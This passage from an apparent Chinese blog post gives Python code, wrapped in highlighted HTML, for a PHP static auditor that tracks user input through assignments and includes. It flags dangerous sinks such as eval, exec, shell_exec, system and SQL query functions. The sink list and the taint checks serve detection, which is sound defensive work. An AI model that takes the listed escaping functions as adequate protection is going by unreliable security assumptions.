class="string">&#x27;unknown&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查 SQL 注入风险</span></span><br><span class="line">        func_name = self.get_func_name(node)</span><br><span class="line">        <span class="keyword">if</span> func_name <span class="keyword">in</span> [<span class="string">&#x27;mysql_query&#x27;</span>, <span class="string">&#x27;mysqli_query&#x27;</span>, <span class="string">&#x27;pg_query&#x27;</span>]:</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> <span class="built_in">getattr</span>(node, <span class="string">&#x27;params&#x27;</span>, []):</span><br><span class="line">                <span class="keyword">if</span> self.contains_user_variable(arg):</span><br><span class="line">                    findings.append(<span class="string">f&quot;Potential SQL usage in <span class="subst">&#123;func_name&#125;</span> at line <span class="subst">&#123;<span class="built_in">getattr</span>(node, <span class="string">&#x27;lineno&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 递归遍历子节点</span></span><br><span class="line">        <span class="keyword">for</span> attr_name, attr_value <span class="keyword">in</span> node.__dict__.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(attr_value, <span class="built_in">list</span>):</span><br><span class="line">                <span class="keyword">for</span> item <span class="keyword">in</span> attr_value:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, php.Node):</span><br><span class="line">                        findings.extend(self.audit_node(item))</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(attr_value, php.Node):</span><br><span class="line">                findings.extend(self.audit_node(attr_value))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> findings</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit_php_code</span>(<span class="params">self, code</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ast_nodes = self.parse_php_code(code)</span><br><span class="line">            <span class="built_in">print</span>(ast_nodes)</span><br><span class="line">            all_findings = []</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> ast_nodes:</span><br><span class="line">                all_findings.extend(self.audit_node(node))</span><br><span class="line">            <span class="keyword">return</span> all_findings</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">f&quot;Error parsing code: <span class="subst">&#123;e&#125;</span>&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_php_files</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    遍历文件夹，获取所有 .php 文件路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    php_files = []</span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(folder_path):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">                php_files.append(os.path.join(root, file))</span><br><span class="line">    <span class="keyword">return</span> php_files</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_folder</span>(<span class="params">folder_path, auditor</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    扫描整个文件夹的 PHP 文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    all_findings = &#123;&#125;</span><br><span class="line">    php_files = get_php_files(folder_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> php_file <span class="keyword">in</span> php_files:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(php_file, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                php_code = f.read()</span><br><span class="line"></span><br><span class="line">            findings = auditor.audit_php_code(php_code)</span><br><span class="line">            <span class="keyword">if</span> findings:</span><br><span class="line">                all_findings[php_file] = findings</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            all_findings[php_file] = [<span class="string">f&quot;Error reading file: <span class="subst">&#123;e&#125;</span>&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> all_findings</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    folder = <span class="string">&quot;./&quot;</span>  <span class="comment"># 输入要扫描的文件夹</span></span><br><span class="line">    auditor = PHPASTAuditor()</span><br><span class="line"></span><br><span class="line">    results = audit_folder(folder, auditor)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file, findings <span class="keyword">in</span> results.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] File: <span class="subst">&#123;file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> finding <span class="keyword">in</span> findings:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    - <span class="subst">&#123;finding&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"><span class="keyword">from</span> phply import phplex</span><br><span class="line"><span class="keyword">from</span> phply.phpparse import make_parser</span><br><span class="line"><span class="keyword">from</span> phply import phpast <span class="keyword">as</span> php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHPASTAuditor</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">_init_parser</span>()</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">danger_functions</span> = [</span></span><br><span class="line"><span class="class">            &#x27;<span class="title">mysql_query</span>&#x27;, &#x27;<span class="title">mysqli_query</span>&#x27;, &#x27;<span class="title">pg_query</span>&#x27;,</span></span><br><span class="line"><span class="class">            &#x27;<span class="title">execute</span>&#x27;, &#x27;<span class="title">eval</span>&#x27;, &#x27;<span class="title">exec</span>&#x27;, &#x27;<span class="title">shell_exec</span>&#x27;,</span></span><br><span class="line"><span class="class">            &#x27;<span class="title">system</span>&#x27;, &#x27;<span class="title">passthru</span>&#x27;, &#x27;<span class="title">query</span>&#x27;</span></span><br><span class="line"><span class="class">        ]</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">safe_functions</span> = [</span></span><br><span class="line"><span class="class">            &#x27;<span class="title">mysql_real_escape_string</span>&#x27;, &#x27;<span class="title">addslashes</span>&#x27;,</span></span><br><span class="line"><span class="class">            &#x27;<span class="title">htmlspecialchars</span>&#x27;, &#x27;<span class="title">intval</span>&#x27;, &#x27;<span class="title">mysqli_real_escape_string</span>&#x27;</span></span><br><span class="line"><span class="class">        ]</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">taint_map</span> = </span>&#123;&#125;</span><br><span class="line">        <span class="built_in">self</span>.visited_files = <span class="title function_ invoke__">set</span>()</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">_init_parser</span>(<span class="built_in">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;重新初始化 lexer 和 parser，保证每次解析从行 1 开始&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">self</span>.lexer = phplex.lexer.<span class="keyword">clone</span>()</span><br><span class="line">        <span class="built_in">self</span>.parser = <span class="title function_ invoke__">make_parser</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 基础工具 ----------------</span></span><br><span class="line">    def <span class="title function_ invoke__">parse_php_code</span>(<span class="built_in">self</span>, code):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>.parser.<span class="title function_ invoke__">parse</span>(code, lexer=<span class="built_in">self</span>.lexer)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">tag_ast_file</span>(<span class="built_in">self</span>, node, filename):</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_ invoke__">isinstance</span>(node, php.Node):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="title function_ invoke__">setattr</span>(node, <span class="string">&#x27;__file__&#x27;</span>, filename)</span><br><span class="line">        <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">safe_iter_node</span>(node):</span><br><span class="line">            <span class="built_in">self</span>.<span class="title function_ invoke__">tag_ast_file</span>(child, filename)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">safe_iter_node</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_ invoke__">isinstance</span>(node, php.Node):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> _, value in <span class="title function_ invoke__">getattr</span>(node, <span class="string">&#x27;__dict__&#x27;</span>, &#123;&#125;).<span class="title function_ invoke__">items</span>():</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(value, php.Node):</span><br><span class="line">                <span class="keyword">yield</span> value</span><br><span class="line">            elif <span class="title function_ invoke__">isinstance</span>(value, <span class="keyword">list</span>):</span><br><span class="line">                <span class="keyword">for</span> item in value:</span><br><span class="line">                    <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(item, php.Node):</span><br><span class="line">                        <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">get_func_name</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.FunctionCall):</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(node.name, <span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> node.name.name</span><br><span class="line">            elif <span class="title function_ invoke__">isinstance</span>(node.name, str):</span><br><span class="line">                <span class="keyword">return</span> node.name</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">is_user_input</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.ArrayOffset) <span class="keyword">and</span> <span class="title function_ invoke__">isinstance</span>(node.node, php.Variable):</span><br><span class="line">            <span class="keyword">return</span> node.node.name in [<span class="string">&#x27;$_GET&#x27;</span>, <span class="string">&#x27;$_POST&#x27;</span>, <span class="string">&#x27;$_REQUEST&#x27;</span>, <span class="string">&#x27;$_COOKIE&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Variable):</span><br><span class="line">            <span class="keyword">return</span> node.name in [<span class="string">&#x27;$_GET&#x27;</span>, <span class="string">&#x27;$_POST&#x27;</span>, <span class="string">&#x27;$_REQUEST&#x27;</span>, <span class="string">&#x27;$_COOKIE&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">mark_taint</span>(<span class="built_in">self</span>, var_name):</span><br><span class="line">        <span class="built_in">self</span>.taint_map[var_name] = True</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">is_tainted</span>(<span class="built_in">self</span>, var_name):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>.taint_map.<span class="title function_ invoke__">get</span>(var_name, False)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 污点分析 ----------------</span></span><br><span class="line">    def <span class="title function_ invoke__">contains_user_input_or_taint</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Parameter):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(node.node)</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Variable):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>.<span class="title function_ invoke__">is_user_input</span>(node) <span class="keyword">or</span> <span class="built_in">self</span>.<span class="title function_ invoke__">is_tainted</span>(node.name)</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.ArrayOffset):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>.<span class="title function_ invoke__">is_user_input</span>(node) <span class="keyword">or</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(node.node)</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.BinaryOp):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(node.left)</span><br><span class="line">                    <span class="keyword">or</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(node.right))</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.FunctionCall):</span><br><span class="line">            func_name = <span class="built_in">self</span>.<span class="title function_ invoke__">get_func_name</span>(node)</span><br><span class="line">            <span class="keyword">if</span> func_name in <span class="built_in">self</span>.safe_functions:</span><br><span class="line">                <span class="keyword">return</span> False</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">any</span>(<span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(p) <span class="keyword">for</span> p in <span class="title function_ invoke__">getattr</span>(node, <span class="string">&#x27;params&#x27;</span>, []))</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Node):</span><br><span class="line">            <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">safe_iter_node</span>(node):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(child):</span><br><span class="line">                    <span class="keyword">return</span> True</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">collect_taints_iterative</span>(<span class="built_in">self</span>, ast_nodes):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;多轮迭代传播污点，直到无新增变量&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        changed = True</span><br><span class="line">        <span class="keyword">while</span> changed:</span><br><span class="line">            changed = False</span><br><span class="line">            stack = <span class="keyword">list</span>(ast_nodes)</span><br><span class="line">            <span class="keyword">while</span> stack:</span><br><span class="line">                node = stack.<span class="title function_ invoke__">pop</span>()</span><br><span class="line">                <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Assignment) <span class="keyword">and</span> <span class="title function_ invoke__">isinstance</span>(node.node, php.Variable):</span><br><span class="line">                    var_name = node.node.name</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(node.expr) <span class="keyword">and</span> not <span class="built_in">self</span>.<span class="title function_ invoke__">is_tainted</span>(var_name):</span><br><span class="line">                        <span class="built_in">self</span>.<span class="title function_ invoke__">mark_taint</span>(var_name)</span><br><span class="line">                        changed = True</span><br><span class="line">                <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">safe_iter_node</span>(node):</span><br><span class="line">                    stack.<span class="title function_ invoke__">append</span>(child)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 危险函数检查 ----------------</span></span><br><span class="line">    def <span class="title function_ invoke__">check_danger_functions</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        findings = []</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_ invoke__">isinstance</span>(node, php.Node):</span><br><span class="line">            <span class="keyword">return</span> findings</span><br><span class="line">        func_name = <span class="built_in">self</span>.<span class="title function_ invoke__">get_func_name</span>(node)</span><br><span class="line">        <span class="keyword">if</span> func_name in <span class="built_in">self</span>.danger_functions:</span><br><span class="line">            <span class="keyword">for</span> arg in <span class="title function_ invoke__">getattr</span>(node, <span class="string">&#x27;params&#x27;</span>, []):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">self</span>.<span class="title function_ invoke__">contains_user_input_or_taint</span>(arg):</span><br><span class="line">                    file = <span class="title function_ invoke__">getattr</span>(node, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">                    line = <span class="title function_ invoke__">getattr</span>(node, <span class="string">&#x27;lineno&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">                    findings.<span class="title function_ invoke__">append</span>(</span><br><span class="line">                        f<span class="string">&quot;[TAINT] Dangerous function &#x27;&#123;func_name&#125;&#x27; in &#123;file&#125; at line &#123;line&#125;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">        <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">safe_iter_node</span>(node):</span><br><span class="line">            findings.<span class="title function_ invoke__">extend</span>(<span class="built_in">self</span>.<span class="title function_ invoke__">check_danger_functions</span>(child))</span><br><span class="line">        <span class="keyword">return</span> findings</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- include/require ----------------</span></span><br><span class="line">    def <span class="title function_ invoke__">process_include</span>(<span class="built_in">self</span>, node, current_dir):</span><br><span class="line">        expr = node.expr</span><br><span class="line">        included_file = None</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(expr, php.Scalar) <span class="keyword">and</span> <span class="title function_ invoke__">isinstance</span>(expr.value, str):</span><br><span class="line">            included_file = expr.value</span><br><span class="line">        <span class="keyword">if</span> included_file:</span><br><span class="line">            included_path = os.path.<span class="title function_ invoke__">abspath</span>(os.path.<span class="title function_ invoke__">join</span>(current_dir, included_file))</span><br><span class="line">            <span class="keyword">if</span> os.path.<span class="title function_ invoke__">exists</span>(included_path) <span class="keyword">and</span> included_path not in <span class="built_in">self</span>.visited_files:</span><br><span class="line">                <span class="built_in">self</span>.visited_files.<span class="title function_ invoke__">add</span>(included_path)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="built_in">self</span>.<span class="title function_ invoke__">_init_parser</span>()  <span class="comment"># 每次 include 文件重新初始化解析器</span></span><br><span class="line">                    with <span class="title function_ invoke__">open</span>(included_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        code = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">                    ast_nodes = <span class="built_in">self</span>.<span class="title function_ invoke__">parse_php_code</span>(code)</span><br><span class="line">                    <span class="keyword">for</span> n in ast_nodes:</span><br><span class="line">                        <span class="built_in">self</span>.<span class="title function_ invoke__">tag_ast_file</span>(n, included_path)</span><br><span class="line">                    <span class="built_in">self</span>.<span class="title function_ invoke__">collect_taints_iterative</span>(ast_nodes)</span><br><span class="line">                    <span class="keyword">for</span> n in ast_nodes:</span><br><span class="line">                        <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">find_include_nodes</span>(n):</span><br><span class="line">                            <span class="built_in">self</span>.<span class="title function_ invoke__">process_include</span>(child, os.path.<span class="title function_ invoke__">dirname</span>(included_path))</span><br><span class="line">                except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span>(f<span class="string">&quot;[WARN] Failed to parse include file &#123;included_path&#125;: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">find_include_nodes</span>(<span class="built_in">self</span>, node):</span><br><span class="line">        nodes = []</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(node, php.Include) <span class="keyword">or</span> <span class="title function_ invoke__">isinstance</span>(node, php.Require):</span><br><span class="line">            nodes.<span class="title function_ invoke__">append</span>(node)</span><br><span class="line">        <span class="keyword">for</span> child in <span class="built_in">self</span>.<span class="title function_ invoke__">safe_iter_node</span>(node):</span><br><span class="line">            nodes.<span class="title function_ invoke__">extend</span>(<span class="built_in">self</span>.<span class="title function_ invoke__">find_include_nodes</span>(child))</span><br><span class="line">        <span class="keyword">return</span> nodes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 主扫描入口 ----------------</span></span><br><span class="line">    def <span class="title function_ invoke__">audit_php_file</span>(<span class="built_in">self</span>, filepath):</span><br><span class="line">        <span class="built_in">self</span>.<span class="title function_ invoke__">_init_parser</span>()  <span class="comment"># 每次扫描文件时重置解析状态</span></span><br><span class="line">        <span class="built_in">self</span>.taint_map.<span class="title function_ invoke__">clear</span>()</span><br><span class="line">        <span class="built_in">self</span>.visited_files.<span class="title function_ invoke__">clear</span>()</span><br><span class="line"></span><br><span class="line">        abs_path = os.path.<span class="title function_ invoke__">abspath</span>(filepath)</span><br><span class="line">        <span class="built_in">self</span>.visited_files.<span class="title function_ invoke__">add</span>(abs_path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            with <span class="title function_ invoke__">open</span>(filepath, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                code = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">            ast_nodes = <span class="built_in">self</span>.<span class="title function_ invoke__">parse_php_code</span>(code)</span><br><span class="line">            <span class="keyword">for</span> n in ast_nodes:</span><br><span class="line">                <span class="built_in">self</span>.<span class="title function_ invoke__">tag_ast_file</span>(n, abs_path)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># include 文件</span></span><br><span class="line">            <span class="keyword">for</span> n in ast_nodes:</span><br><span class="line">                <span class="keyword">for</span> inc in <span class="built_in">self</span>.<span class="title function_ invoke__">find_include_nodes</span>(n):</span><br><span class="line">                    <span class="built_in">self</span>.<span class="title function_ invoke__">process_include</span>(inc, os.path.<span class="title function_ invoke__">dirname</span>(filepath))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 收集污点</span></span><br><span class="line">            <span class="built_in">self</span>.<span class="title function_ invoke__">collect_taints_iterative</span>(ast_nodes)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查危险函数</span></span><br><span class="line">            findings = []</span><br><span class="line">            <span class="keyword">for</span> n in ast_nodes:</span><br><span class="line">                findings.<span class="title function_ invoke__">extend</span>(<span class="built_in">self</span>.<span class="title function_ invoke__">check_danger_functions</span>(n))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> findings, <span class="keyword">list</span>(<span class="built_in">self</span>.taint_map.<span class="title function_ invoke__">keys</span>())</span><br><span class="line">        except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> [f<span class="string">&quot;Error parsing file: &#123;e&#125;&quot;</span>], []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.py</span><br><span class="line"><span class="keyword">from</span> php_auditor import PHPASTAuditor</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">scan_folder</span>(folder):</span><br><span class="line">    auditor = <span class="title function_ invoke__">PHPASTAuditor</span>()</span><br><span class="line">    all_results = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> root, _, files in os.<span class="title function_ invoke__">walk</span>(folder):</span><br><span class="line">        <span class="keyword">for</span> file in files:</span><br><span class="line">            <span class="keyword">if</span> file.<span class="title function_ invoke__">endswith</span>(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">                path = os.path.<span class="title function_ invoke__">join</span>(root, file)</span><br><span class="line">                findings, taints = auditor.<span class="title function_ invoke__">audit_php_file</span>(path)</span><br><span class="line">                all_results[path] = &#123;<span class="string">&quot;taints&quot;</span>: taints, <span class="string">&quot;findings&quot;</span>: findings&#125;</span><br><span class="line">    <span class="keyword">return</span> all_results</span><br><span class="line">folder = <span class="string">&quot;./&quot;</span>  <span class="comment"># 当前目录</span></span><br><span class="line">results = <span class="title function_ invoke__">scan_folder</span>(folder)</span><br><span class="line"><span class="keyword">for</span> file, info in results.<span class="title function_ invoke__">items</span>():</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[+] File: &#123;file&#125;&quot;</span>)</span><br><span 